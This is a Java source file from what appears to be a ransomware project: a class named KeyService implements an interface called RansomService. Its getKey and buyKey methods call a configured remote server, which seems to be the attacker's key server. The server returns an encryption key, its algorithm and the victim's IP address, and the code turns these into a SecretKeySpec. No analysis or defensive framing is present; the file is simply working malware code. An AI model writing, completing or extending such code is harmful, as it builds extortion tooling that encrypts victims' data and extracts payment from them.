package Agent.services;

import javax.crypto.spec.SecretKeySpec;

import org.json.JSONObject;
import org.springframework.beans.factory.annotation.Value;

import Agent.Utils.HttpUtil;
import Agent.entites.CryptoKey;
import Agent.exceptions.CryptoException;
import Agent.exceptions.HttpResException;
import Agent.exceptions.InOutException;
import Agent.exceptions.JsonException;

public class KeyService implements RansomService {
	@Value("${server.url.get}")
	private String urlgetKey;
	@Value("${server.url.buy}")
	private String urlbuyKey;

	@Override
	public CryptoKey getKey() throws CryptoException {
		return sendRequest(urlgetKey);
	}

	@Override
	public CryptoKey buyKey() throws CryptoException {
		return sendRequest(urlbuyKey);
	}

	private CryptoKey sendRequest(String url) throws CryptoException {
		try {
			JSONObject json = (JSONObject) HttpUtil.get(url);
			String al = json.get("algorithm").toString();
			byte[] decodedKey = json.get("_key").toString().getBytes();
			return new CryptoKey(json.get("ip").toString(), new SecretKeySpec(decodedKey, 0, decodedKey.length, al),
					al);
		} catch (InOutException | HttpResException | JsonException e) {
			throw new CryptoException("Request denied", e);
		}
	}
}